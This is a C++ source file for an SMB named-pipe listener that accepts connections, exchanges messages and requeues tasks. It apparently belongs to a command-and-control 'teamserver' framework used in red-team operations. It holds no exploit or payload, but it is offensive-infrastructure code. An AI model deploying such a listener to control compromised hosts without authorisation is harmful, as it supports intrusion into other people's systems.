#include "ListenerSmb.hpp"
#include <PipeHandler.hpp>


using namespace std;
using json = nlohmann::json;


// Initializes an SMB listener that can be contacted at the specified IP address or domain and named pipe.
// - Generates a random listener hash for identification.
// - Prepares metadata containing the listener type, IP, and pipe name, serialized as a JSON string.
// - Creates a named pipe server using the specified pipe name to handle SMB communication.
// - Launches the SMB server handler in a separate thread to listen for incoming connections.
ListenerSmb::ListenerSmb(const std::string& ip, const std::string& pipeName, const nlohmann::json& config)
        : Listener(ip, pipeName, ListenerSmbType)
{
        m_listenerHash = random_string(SizeListenerHash);

    json metadata;
    metadata["1"] = ListenerSmbType;
    metadata["2"] = ip;
    metadata["3"] = pipeName;
    m_metadata = metadata.dump();

        m_serverSmb = new PipeHandler::Server(pipeName);

#ifdef BUILD_TEAMSERVER
        // Logger
        std::vector<spdlog::sink_ptr> sinks;

        auto console_sink = std::make_shared<spdlog::sinks::stdout_color_sink_mt>();
        auto logLevel = resolveLogLevel(config);
        console_sink->set_level(logLevel);
    sinks.push_back(console_sink);


        auto file_sink = std::make_shared<spdlog::sinks::rotating_file_sink_mt>("logs/Listener_"+ListenerSmbType+"_"+m_listenerHash+".txt", 1024*1024*10, 3);
        file_sink->set_level(spdlog::level::trace);
        sinks.push_back(file_sink);

    m_logger = std::make_shared<spdlog::logger>("Listener_"+ListenerSmbType+"_"+m_listenerHash.substr(0,8), begin(sinks), end(sinks));
        m_logger->set_level(logLevel);
        m_logger->info("Initializing SMB listener on {} using pipe {}", ip, pipeName);
#endif

        m_stopThread.store(true);
}

int ListenerSmb::init()
{
#ifdef _WIN32
    if (m_smbServ && m_smbServ->joinable())
        return 1;
    if (!m_serverSmb->openServer())
        return -1;
    m_stopThread.store(false);
    try
    {
        m_smbServ = std::make_unique<std::thread>(&ListenerSmb::launchSmbServ, this);
    }
    catch (...)
    {
        m_stopThread.store(true);
        m_serverSmb->stop();
        return -1;
    }
    return 1;
#else
    return -1;
#endif
}


ListenerSmb::~ListenerSmb()
{
    m_stopThread.store(true);
    m_serverSmb->stop();

    if(m_smbServ && m_smbServ->joinable())
        m_smbServ->join();

        delete m_serverSmb;

#ifdef BUILD_TEAMSERVER
        if(m_logger)
                m_logger->info("SMB listener stopped on {} pipe {}", m_param1, m_param2);
#endif
}

void ListenerSmb::launchSmbServ()
{
    try 
    {
        while(!m_stopThread.load())
        {
                        if(!m_serverSmb->acceptConnection())
                        {
                            if(m_stopThread.load())
                                break;
                            if(!m_serverSmb->openServer())
                                break;
                            continue;
                        }

                        string input;
                        if(!m_serverSmb->receiveData(input) || input.empty())
                        {
                            if(!m_stopThread.load() && !m_serverSmb->openServer())
                                break;
                            continue;
                        }
                        if(m_stopThread.load())
                            break;

#ifdef BUILD_TEAMSERVER
                        if(m_logger && m_logger->should_log(spdlog::level::debug))
                                m_logger->debug("Received {} bytes via SMB pipe {}", input.size(), m_param2);
#endif

                        string output;
                        std::vector<PendingTask> dequeuedTasks;
                        try
                        {
                                handleMessages(input, output, &dequeuedTasks);

#ifdef BUILD_TEAMSERVER
                                if(m_logger && m_logger->should_log(spdlog::level::debug))
                                        m_logger->debug("Sending {} bytes via SMB pipe {}", output.size(), m_param2);
#endif

                                if(!m_serverSmb->sendData(output))
                                {
                                    restoreTasks(dequeuedTasks);
#ifdef BUILD_TEAMSERVER
                                    if(m_logger)
                                        m_logger->warn("SMB response failed; restored {} queued tasks", dequeuedTasks.size());
#endif
                                }
                                else
                                    m_serverSmb->waitForClientClose();
                        }
                        catch (...)
                        {
                            restoreTasks(dequeuedTasks);
                        }
                        if(!m_stopThread.load() && !m_serverSmb->openServer())
                            break;
        }
    }
    catch (...)
    {
        return;
    }

    return;
}
